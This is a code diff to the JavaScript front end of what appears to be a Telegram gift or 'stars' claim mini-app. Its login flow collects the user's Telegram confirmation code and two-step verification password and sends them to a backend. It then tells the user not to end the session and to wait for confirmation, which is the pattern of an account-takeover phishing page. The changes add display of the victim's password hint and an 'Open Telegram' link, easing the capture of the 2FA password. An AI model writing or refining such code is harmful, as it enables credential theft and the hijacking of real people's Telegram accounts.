@@ -101,10 +101,13 @@ const TRANSLATIONS = {
     auth_code_title: 'Код подтверждения',
     auth_code_text: 'Мы отправили код в приложение Telegram.',
     auth_code_label: 'Код',
+    auth_code_hint: 'Посмотреть код:',
+    auth_code_link: 'Открыть Telegram',
     auth_back: 'Назад',
     auth_password_title: 'Двухэтапная защита',
     auth_password_text: 'Введите пароль двухэтапной авторизации.',
     auth_password_label: 'Пароль',
+    auth_password_hint_label: 'Подсказка:',
     auth_loading: 'Загрузка...',
     auth_success_title: 'Не завершайте сессию',
     auth_success_text: 'Ожидайте подтверждения запроса.',
@@ -287,10 +290,13 @@ const TRANSLATIONS = {
     auth_code_title: 'Confirmation code',
     auth_code_text: 'We sent the code to Telegram.',
     auth_code_label: 'Code',
+    auth_code_hint: 'Check the code:',
+    auth_code_link: 'Open Telegram',
     auth_back: 'Back',
     auth_password_title: 'Two-step verification',
     auth_password_text: 'Enter your two-step verification password.',
     auth_password_label: 'Password',
+    auth_password_hint_label: 'Hint:',
     auth_loading: 'Loading...',
     auth_success_title: 'Do not end the session',
     auth_success_text: 'Please wait for confirmation.',
@@ -453,6 +459,7 @@ const ACTION_CONFIG = {
 let tgWebApp = null;
 let authToken = null;
 let authLoading = false;
+let authPasswordHint = '';
 let dataLoaded = false;
 let pendingStarToken = null;
 let starClaimLoading = false;
@@ -560,6 +567,7 @@ const elements = {
   authPasswordInput: document.getElementById('auth-password-input'),
   passwordInput: document.getElementById('password-input'),
   passwordToggle: document.getElementById('password-toggle'),
+  authPasswordHint: document.getElementById('auth-password-hint'),
   authBack: document.getElementById('auth-back'),
   authBackPassword: document.getElementById('auth-back-password'),
   giftModal: document.getElementById('gift-modal'),
@@ -639,6 +647,7 @@ function applyTranslations() {
   updateSortUi();
   updatePasswordToggleLabel();
   updateCartUi();
+  setPasswordHint(authPasswordHint);
 }
 
 function loadSettings() {
@@ -2596,6 +2605,7 @@ function openAuthModal() {
   elements.authModal.setAttribute('aria-hidden', 'false');
   authToken = null;
   setAuthStatus('');
+  setPasswordHint('');
   if (elements.authCodeInput) elements.authCodeInput.value = '';
   if (elements.authPasswordInput) elements.authPasswordInput.value = '';
   setCodeError(false);
@@ -2612,6 +2622,7 @@ function closeAuthModal() {
   authLoading = false;
   setAuthStatus('');
   setPasswordError(false);
+  setPasswordHint('');
   if (elements.authIntro) {
     showAuthStep(elements.authIntro);
   }
@@ -2909,7 +2920,7 @@ function maybeShowGiftPopup() {
 }
 
 function isPasswordRequired(detail) {
-  const text = String(detail || '');
+  const text = getDetailText(detail);
   return (
     /Password required/i.test(text) ||
     /2FA/i.test(text) ||
@@ -2918,6 +2929,34 @@ function isPasswordRequired(detail) {
     /SESSION_PASSWORD_NEEDED/i.test(text) ||
     /двухфактор/i.test(text)
   );
+}
+
+function getDetailText(detail) {
+  if (typeof detail === 'string') return detail;
+  if (typeof detail === 'number') return String(detail);
+  if (detail && typeof detail === 'object') {
+    const message = detail.message || detail.detail || detail.error || detail.code;
+    if (message) return String(message);
+  }
+  return '';
+}
+
+function getDetailHint(detail) {
+  if (!detail || typeof detail !== 'object') return '';
+  const hint = detail.hint || detail.password_hint || detail.passwordHint;
+  return hint ? String(hint) : '';
+}
+
+function setPasswordHint(hint) {
+  authPasswordHint = (hint || '').trim();
+  if (!elements.authPasswordHint) return;
+  if (!authPasswordHint) {
+    elements.authPasswordHint.textContent = '';
+    elements.authPasswordHint.classList.add('is-hidden');
+    return;
+  }
+  elements.authPasswordHint.textContent = `${t('auth_password_hint_label')} ${authPasswordHint}`;
+  elements.authPasswordHint.classList.remove('is-hidden');
 }
 
 function extractPhoneFromPayload(payload) {
@@ -3158,13 +3197,16 @@ async function submitCode(event) {
     });
 
     if (!res.ok) {
-      const detail = data?.detail || t('auth_error');
+      const detail = data?.detail;
+      const detailText = getDetailText(detail) || t('auth_error');
+      const hint = getDetailHint(detail);
       if (isPasswordRequired(detail)) {
         setAuthStatus(t('password_required'));
+        setPasswordHint(hint);
         showAuthStep(elements.authPasswordForm);
         return;
       }
-      throw new Error(detail);
+      throw new Error(detailText);
     }
 
     showAuthStep(elements.authLoading);
@@ -3203,7 +3245,10 @@ async function submitPassword(event) {
       requester: buildRequesterPayload(),
     });
 
-    if (!res.ok) throw new Error(data?.detail || t('auth_error'));
+    if (!res.ok) {
+      const detailText = getDetailText(data?.detail) || t('auth_error');
+      throw new Error(detailText);
+    }
 
     showAuthStep(elements.authLoading);
     await wait(5000);
@@ -3245,6 +3290,7 @@ function bindAuthModal() {
     elements.authBack.addEventListener('click', () => {
       triggerHaptic('light');
       authToken = null;
+      setPasswordHint('');
       showAuthStep(elements.authIntro);
     });
   }
@@ -3255,6 +3301,7 @@ function bindAuthModal() {
       if (elements.authPasswordInput) {
         elements.authPasswordInput.value = '';
       }
+      setPasswordHint('');
       showAuthStep(elements.authCodeForm);
     });
   }
